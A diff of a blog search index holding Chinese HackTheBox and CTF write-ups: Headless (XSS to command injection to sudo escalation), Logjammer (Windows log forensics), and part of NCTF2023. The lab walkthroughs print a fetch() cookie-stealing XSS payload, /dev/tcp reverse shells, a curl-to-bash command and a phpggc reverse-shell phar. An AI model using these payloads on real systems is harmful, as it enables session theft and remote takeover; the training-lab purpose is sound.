@@ -423,6 +423,90 @@
       </tags>
   </entry>
   <entry>
+    <title>Headless-HackTheBox</title>
+    <url>/article/Headless-HackTheBox.html</url>
+    <content><![CDATA[<p>XSS跨站脚本攻击、sh脚本提权</p>
+<span id="more"></span>
+
+<h1 id="Headless-HackTheBox"><a href="#Headless-HackTheBox" class="headerlink" title="Headless-HackTheBox"></a>Headless-HackTheBox</h1><p>信息搜集</p>
+<p>使用nmap扫描一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.8</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Headless-HackTheBox/image-20240331155537558.png"></p>
+<p>可以发现5000端口是开放的，继续扫一下目录</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331163111975.png"></p>
+<p>访问<code>/dashboard</code>发现只有admin才可以，我们注意到cookie值为JWT加密，拿到揭秘网站验证下猜想</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331173230979.png"></p>
+<p>cookie为user用户，那么我们要想访问必须拿到admin的cookie</p>
+<p>访问<code>/support</code>路径存在类似提交留言的功能，应该是存在xss注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提交后会发现提示Hacking</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331172458874.png"></p>
+<p>说明思路没错，那么我们可以利用xss注入得到admin的cookie值，payload如下</p>
+<p>（利用fetch函数对我们服务器发送网络请求）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=fetch(&quot;http://10.10.14.34:80/?cookie=&quot;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>
+
+<p>经过多次尝试，发现我触发payload的条件必须在<code>User-Agent</code>和<code>message</code>参数都有才行。而国外师傅们不同wp中<code>User-Agent</code>都是payload触发点，但是message参数值的不同。有的是下图这样而有的是<code>message=test;</code></p>
+<p><img src="/article/Headless-HackTheBox/image-20240331172008225.png"></p>
+<p>不过好在是拿到了admin的cookie</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331171946128.png"></p>
+<p>成功访问<code>/dashboard</code>，然后抓包发现data参数存在命令注入</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331174558986.png"></p>
+<p>尝试直接反弹shell发现不行，那么试一下用curl命令</p>
+<ol>
+<li><p>首先在本地创建shell.sh文件，写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.34/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后在本地开启http服务，用来被靶机读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后用curl命令去读取我们的shell.sh文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date=;curl 10.10.14.34/shell.sh |bash</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>成功反弹shell</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331175715080.png"></p>
+<p>得到user的flag</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331175800113.png"></p>
+<p>我们尝试用sudo提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>发现只有<code>/usr/bin/syscheck</code>可用</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331180740517.png"></p>
+<p>我们strings命令查看下得到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ &quot;$EUID&quot; -ne 0 ]; then</span><br><span class="line">  exit 1</span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name &#x27;vmlinuz*&#x27; -exec stat -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d &quot;@$last_modified_time&quot; +&quot;%d/%m/%Y %H:%M&quot;)</span><br><span class="line">/usr/bin/echo &quot;Last Kernel Modification Time: $formatted_time&quot;</span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#x27;NR==2 &#123;print $4&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;Available disk space: $disk_space&quot;</span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#x27;load average:&#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;System load average: $load_average&quot;</span><br><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+
+<p>重点看下面这段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+
+<p>这段代码大概意思就是，if语句先使用pgrep命令检测<code>initdb.sh</code>是否存在，如果不存在则执行该sh文件并丢弃错误输出</p>
+<p>而我们在根目录下并没有找到该sh文件，那么我们可以简单利用一下</p>
+<ol>
+<li><p>首先创建<code>initdb.sh</code>文件，写入提升权限的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;chmod u+s /bin/bash&quot; &gt; initdb.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>然后赋予该sh脚本的执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x initdb.sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最后sudo执行<code>/usr/bin/syscheck</code>，成功运行sh脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/syscheck</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="/article/Headless-HackTheBox/image-20240331181954932.png"></p>
+<p>运行sh脚本后，用-p参数启动<code>Bash Shell</code>并以特权模式运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>
+
+<p>得到root的flag</p>
+<p><img src="/article/Headless-HackTheBox/image-20240331182210478.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hospital-HackTheBox</title>
     <url>/article/Hospital-HackTheBox.html</url>
     <content><![CDATA[<p>Ubuntu内核版本漏洞提权、CVE-2023-36664</p>
@@ -599,6 +683,84 @@
       <categories>
         <category>漏洞分析</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Logjammer-HackTheBox</title>
+    <url>/article/Logjammer-HackTheBox.html</url>
+    <content><![CDATA[<p>多个Windows日志文件进行分析，不同的操作被记录在不同的日志并且对应的事件ID很重要，极大方便我们审计日志</p>
+<span id="more"></span>
+
+
+
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
+<p>您有机会在一家大型咨询公司担任初级 DFIR 顾问。但是，他们提供了技术评估供您完成。咨询公司 Forela-Security 希望评估您对 Windows 事件日志分析的了解。请分析并报告他们提出的问题。</p>
+</blockquote>
+<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>用户 cyberjunkie 何时成功登录他的计算机？ （世界标准时间）</strong></p>
+<p>题目附件有五个，其中记录Windows登录的日志文件为<code>Security.evtx</code></p>
+<p>我们进行搜索找到cyberjunkie登录的时间，转换一下为<code>27/03/2023 14:37:09</code></p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422170139500.png"></p>
+<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>用户篡改了系统上的防火墙设置。分析防火墙事件日志以找出添加的防火墙规则的名称？</strong></p>
+<p>我们切换到<code>Windows Firewall-Firewall.evtx</code>日志文件，初步发现事件2004是修改&#x2F;添加规则的</p>
+<p>那么我们在Windows系统下，使用工具EvtxeCmd将其转换成json格式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./EvtxeCmd.exe -f D:\网安工具\取证\附件\Windows-Firewall-Firewall.evtx --json D:\网安工具\取证\附件</span><br></pre></td></tr></table></figure>
+
+<p>然后使用jq命令筛选事件2004和查询PayloadData1字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 20240422094340_EvtxECmd_Output.json | D:\网安工具\取证\jq-1.7.1\jq -c &#x27;select(.EventId == 2004)&#x27; | D:\网安工具\取证\jq-1.7.1\jq -s &#x27;.[0] | [.PayloadData1]&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>得到添加的规则为<code>Metasploit C2 Bypass</code></p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422194553198.png"></p>
+<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>防火墙规则的方向是什么？</strong></p>
+<p>很明显是出站，英文就是outbound</p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422195244130.png"></p>
+<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>用户更改了计算机的审计策略。这个更改策略的子类是什么？</strong></p>
+<p>审计策略更改的日志 ID 为 <code>4719</code></p>
+<p>子类为<code>Other Object Access Events</code></p>
+<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>用户“cyberjunkie”创建了一个计划任务。这个任务的名字是什么？</strong></p>
+<blockquote>
+<p>在 Windows 操作系统中，创建计划任务的事件将被记录在 Windows 安全事件日志（Security Event Log）中，并使用事件 ID 4698</p>
+</blockquote>
+<p>直接筛选事件为4698，任务名为<code>HTB-AUTOMATION</code></p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422200633789.png"></p>
+<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>为任务安排的文件的完整路径是什么？</strong></p>
+<p>在前一题的TaskContent找到路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Desktop\Automation-HTB.ps1</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>该命令的参数是什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A cyberjunkie@hackthebox.eu</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Logjammer-HackTheBox/image-20240422200911551.png"></p>
+<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>系统上运行的防病毒软件识别出威胁并对其执行操作。哪个工具被防病毒软件识别为恶意软件？</strong></p>
+<p>该操作是在<code>Windows Defender</code>日志文件下记录的，并且对应ID为1117、1003、1004、1116等</p>
+<p>所以我们直接锁定到事件1117，发现恶意软件被警告</p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422201354285.png"></p>
+<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>引发警报的恶意软件的完整路径是什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Downloads\SharpHound-v1.1.0.zip</span><br></pre></td></tr></table></figure>
+
+<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>防病毒软件采取了什么行动？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Quarantine  //隔离</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Logjammer-HackTheBox/image-20240422201658602.png"></p>
+<h1 id="Task11"><a href="#Task11" class="headerlink" title="Task11"></a>Task11</h1><p><strong>用户使用Powershell执行命令。用户执行了什么命令？</strong></p>
+<blockquote>
+<p>一般情况下，用户在 PowerShell 中执行命令所生成的事件记录在 Windows 安全事件日志（Security Event Log）中的事件 ID 4104。</p>
+</blockquote>
+<p>直接切换到<code>Powershell-Operational</code>日志文件，然后筛选事件4104，找到执行的命令</p>
+<p><img src="/article/Logjammer-HackTheBox/image-20240422202108317.png"></p>
+<h1 id="Task12"><a href="#Task12" class="headerlink" title="Task12"></a>Task12</h1><p><strong>我们怀疑用户删除了一些事件日志。哪个事件日志文件被清除？</strong></p>
+<p>切换到System日志文件，找到被删除的日志文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft-Windows-Windows Firewall With Advanced Security/Firewall</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Logjammer-HackTheBox/image-20240422202827593.png"></p>
+]]></content>
+      <categories>
+        <category>日志分析</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>Windows</tag>
+      </tags>
   </entry>
   <entry>
     <title>Meerkat-HackTheBox</title>
@@ -792,168 +954,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Headless-HackTheBox</title>
-    <url>/article/Headless-HackTheBox.html</url>
-    <content><![CDATA[<p>XSS跨站脚本攻击、sh脚本提权</p>
-<span id="more"></span>
-
-<h1 id="Headless-HackTheBox"><a href="#Headless-HackTheBox" class="headerlink" title="Headless-HackTheBox"></a>Headless-HackTheBox</h1><p>信息搜集</p>
-<p>使用nmap扫描一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.8</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Headless-HackTheBox/image-20240331155537558.png"></p>
-<p>可以发现5000端口是开放的，继续扫一下目录</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331163111975.png"></p>
-<p>访问<code>/dashboard</code>发现只有admin才可以，我们注意到cookie值为JWT加密，拿到揭秘网站验证下猜想</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331173230979.png"></p>
-<p>cookie为user用户，那么我们要想访问必须拿到admin的cookie</p>
-<p>访问<code>/support</code>路径存在类似提交留言的功能，应该是存在xss注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>提交后会发现提示Hacking</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331172458874.png"></p>
-<p>说明思路没错，那么我们可以利用xss注入得到admin的cookie值，payload如下</p>
-<p>（利用fetch函数对我们服务器发送网络请求）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=fetch(&quot;http://10.10.14.34:80/?cookie=&quot;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>
-
-<p>经过多次尝试，发现我触发payload的条件必须在<code>User-Agent</code>和<code>message</code>参数都有才行。而国外师傅们不同wp中<code>User-Agent</code>都是payload触发点，但是message参数值的不同。有的是下图这样而有的是<code>message=test;</code></p>
-<p><img src="/article/Headless-HackTheBox/image-20240331172008225.png"></p>
-<p>不过好在是拿到了admin的cookie</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331171946128.png"></p>
-<p>成功访问<code>/dashboard</code>，然后抓包发现data参数存在命令注入</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331174558986.png"></p>
-<p>尝试直接反弹shell发现不行，那么试一下用curl命令</p>
-<ol>
-<li><p>首先在本地创建shell.sh文件，写入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.34/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后在本地开启http服务，用来被靶机读取文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后用curl命令去读取我们的shell.sh文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date=;curl 10.10.14.34/shell.sh |bash</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>成功反弹shell</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331175715080.png"></p>
-<p>得到user的flag</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331175800113.png"></p>
-<p>我们尝试用sudo提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-
-<p>发现只有<code>/usr/bin/syscheck</code>可用</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331180740517.png"></p>
-<p>我们strings命令查看下得到源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ &quot;$EUID&quot; -ne 0 ]; then</span><br><span class="line">  exit 1</span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name &#x27;vmlinuz*&#x27; -exec stat -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d &quot;@$last_modified_time&quot; +&quot;%d/%m/%Y %H:%M&quot;)</span><br><span class="line">/usr/bin/echo &quot;Last Kernel Modification Time: $formatted_time&quot;</span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#x27;NR==2 &#123;print $4&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;Available disk space: $disk_space&quot;</span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#x27;load average:&#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;System load average: $load_average&quot;</span><br><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
-
-<p>重点看下面这段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
-
-<p>这段代码大概意思就是，if语句先使用pgrep命令检测<code>initdb.sh</code>是否存在，如果不存在则执行该sh文件并丢弃错误输出</p>
-<p>而我们在根目录下并没有找到该sh文件，那么我们可以简单利用一下</p>
-<ol>
-<li><p>首先创建<code>initdb.sh</code>文件，写入提升权限的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;chmod u+s /bin/bash&quot; &gt; initdb.sh</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后赋予该sh脚本的执行权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x initdb.sh</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>最后sudo执行<code>/usr/bin/syscheck</code>，成功运行sh脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/syscheck</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p><img src="/article/Headless-HackTheBox/image-20240331181954932.png"></p>
-<p>运行sh脚本后，用-p参数启动<code>Bash Shell</code>并以特权模式运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>
-
-<p>得到root的flag</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331182210478.png"></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Logjammer-HackTheBox</title>
-    <url>/article/Logjammer-HackTheBox.html</url>
-    <content><![CDATA[<p>多个Windows日志文件进行分析，不同的操作被记录在不同的日志并且对应的事件ID很重要，极大方便我们审计日志</p>
-<span id="more"></span>
-
-
-
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
-<p>您有机会在一家大型咨询公司担任初级 DFIR 顾问。但是，他们提供了技术评估供您完成。咨询公司 Forela-Security 希望评估您对 Windows 事件日志分析的了解。请分析并报告他们提出的问题。</p>
-</blockquote>
-<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>用户 cyberjunkie 何时成功登录他的计算机？ （世界标准时间）</strong></p>
-<p>题目附件有五个，其中记录Windows登录的日志文件为<code>Security.evtx</code></p>
-<p>我们进行搜索找到cyberjunkie登录的时间，转换一下为<code>27/03/2023 14:37:09</code></p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422170139500.png"></p>
-<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>用户篡改了系统上的防火墙设置。分析防火墙事件日志以找出添加的防火墙规则的名称？</strong></p>
-<p>我们切换到<code>Windows Firewall-Firewall.evtx</code>日志文件，初步发现事件2004是修改&#x2F;添加规则的</p>
-<p>那么我们在Windows系统下，使用工具EvtxeCmd将其转换成json格式</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./EvtxeCmd.exe -f D:\网安工具\取证\附件\Windows-Firewall-Firewall.evtx --json D:\网安工具\取证\附件</span><br></pre></td></tr></table></figure>
-
-<p>然后使用jq命令筛选事件2004和查询PayloadData1字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 20240422094340_EvtxECmd_Output.json | D:\网安工具\取证\jq-1.7.1\jq -c &#x27;select(.EventId == 2004)&#x27; | D:\网安工具\取证\jq-1.7.1\jq -s &#x27;.[0] | [.PayloadData1]&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>得到添加的规则为<code>Metasploit C2 Bypass</code></p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422194553198.png"></p>
-<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>防火墙规则的方向是什么？</strong></p>
-<p>很明显是出站，英文就是outbound</p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422195244130.png"></p>
-<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>用户更改了计算机的审计策略。这个更改策略的子类是什么？</strong></p>
-<p>审计策略更改的日志 ID 为 <code>4719</code></p>
-<p>子类为<code>Other Object Access Events</code></p>
-<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>用户“cyberjunkie”创建了一个计划任务。这个任务的名字是什么？</strong></p>
-<blockquote>
-<p>在 Windows 操作系统中，创建计划任务的事件将被记录在 Windows 安全事件日志（Security Event Log）中，并使用事件 ID 4698</p>
-</blockquote>
-<p>直接筛选事件为4698，任务名为<code>HTB-AUTOMATION</code></p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422200633789.png"></p>
-<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>为任务安排的文件的完整路径是什么？</strong></p>
-<p>在前一题的TaskContent找到路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Desktop\Automation-HTB.ps1</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>该命令的参数是什么？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A cyberjunkie@hackthebox.eu</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Logjammer-HackTheBox/image-20240422200911551.png"></p>
-<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>系统上运行的防病毒软件识别出威胁并对其执行操作。哪个工具被防病毒软件识别为恶意软件？</strong></p>
-<p>该操作是在<code>Windows Defender</code>日志文件下记录的，并且对应ID为1117、1003、1004、1116等</p>
-<p>所以我们直接锁定到事件1117，发现恶意软件被警告</p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422201354285.png"></p>
-<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>引发警报的恶意软件的完整路径是什么？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Downloads\SharpHound-v1.1.0.zip</span><br></pre></td></tr></table></figure>
-
-<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>防病毒软件采取了什么行动？</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Quarantine  //隔离</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Logjammer-HackTheBox/image-20240422201658602.png"></p>
-<h1 id="Task11"><a href="#Task11" class="headerlink" title="Task11"></a>Task11</h1><p><strong>用户使用Powershell执行命令。用户执行了什么命令？</strong></p>
-<blockquote>
-<p>一般情况下，用户在 PowerShell 中执行命令所生成的事件记录在 Windows 安全事件日志（Security Event Log）中的事件 ID 4104。</p>
-</blockquote>
-<p>直接切换到<code>Powershell-Operational</code>日志文件，然后筛选事件4104，找到执行的命令</p>
-<p><img src="/article/Logjammer-HackTheBox/image-20240422202108317.png"></p>
-<h1 id="Task12"><a href="#Task12" class="headerlink" title="Task12"></a>Task12</h1><p><strong>我们怀疑用户删除了一些事件日志。哪个事件日志文件被清除？</strong></p>
-<p>切换到System日志文件，找到被删除的日志文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft-Windows-Windows Firewall With Advanced Security/Firewall</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Logjammer-HackTheBox/image-20240422202827593.png"></p>
-]]></content>
-      <categories>
-        <category>日志分析</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>NCTF2023</title>
     <url>/article/NCTF2023.html</url>
     <content><![CDATA[<p>质量很高的比赛，收获满满</p>
@@ -1040,10 +1040,10 @@
 
 <p>hint1应该是能通过wpscan扫出来有用的线索，刚好hint4是给的扫描结果；然后hint2说注意版本以及第三方东西，应该就是插件</p>
 <p>那么我们看一下扫描结果</p>
-<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20231229143529891.png"></p>
+<p><img src="/article/NCTF2023/image-20231229143529891.png"></p>
 <p>果然是扫出来几个插件，重点看向all-in-one-video-gallery和drag-and-drop-multiple-file-upload-contact-form-7以及对应的版本</p>
 <p>我们根据关键词搜出来all-in-one-video-gallery插件具有ssrf和文件读取漏洞并且知道对应cve漏洞编号</p>
-<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20231229140607931.png"></p>
+<p><img src="/article/NCTF2023/image-20231229140607931.png"></p>
 <p>在网上找到篇文章如何构造ssrf漏洞 <a href="https://blog.amanrawat.in/2022/09/28/CVE-2022-2633.html">参考链接</a></p>
 <p>在<code>/index.php/video</code>路由下存在dl参数，如果不为数字则对其base64解码</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function download_video() &#123;</span><br><span class="line">if ( ! isset( $_GET[&#x27;dl&#x27;] ) ) &#123;</span><br><span class="line">	return;</span><br><span class="line">&#125;	</span><br><span class="line">		</span><br><span class="line">if ( is_numeric( $_GET[&#x27;dl&#x27;] ) ) &#123;</span><br><span class="line">	$file = get_post_meta( (int) $_GET[&#x27;dl&#x27;], &#x27;mp4&#x27;, true );</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$file = base64_decode( $_GET[&#x27;dl&#x27;] );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( empty( $file ) ) &#123;</span><br><span class="line">	die( esc_html__( &#x27;Download file URL is empty.&#x27;, &#x27;all-in-one-video-gallery&#x27; ) );</span><br><span class="line">	exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -1070,34 +1070,34 @@
 <blockquote>
 <p>至于为什么思路是上传phar文件，我们结合前文分析的漏洞可以知道用协议去读取文件，当然包括phar协议</p>
 </blockquote>
-<p><img src="/article/C:/Users\罗思远\AppData\Roaming\Typora\typora-user-images\image-20231229143821345.png"></p>
+<p><img src="/article/NCTF2023/image-20231229143821345.png"></p>
 <p>这篇文章直接就给了POC，大概意思就是在<code>/wp-admin/admin-ajax.php</code>路径进行文件上传，我们把该poc中的xss内容换成我们phar文件内容即可</p>
 <p>那么我们先生成用来RCE的phar文件，直接用工具phpggc生成反弹shell文件</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./phpggc WordPress/RCE2 system &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&#x27;&quot; -p phar -o ~/payload.phar</span><br></pre></td></tr></table></figure>
 
 <p>在题目访问<code>/wp-admin/admin-ajax.php</code>抓包</p>
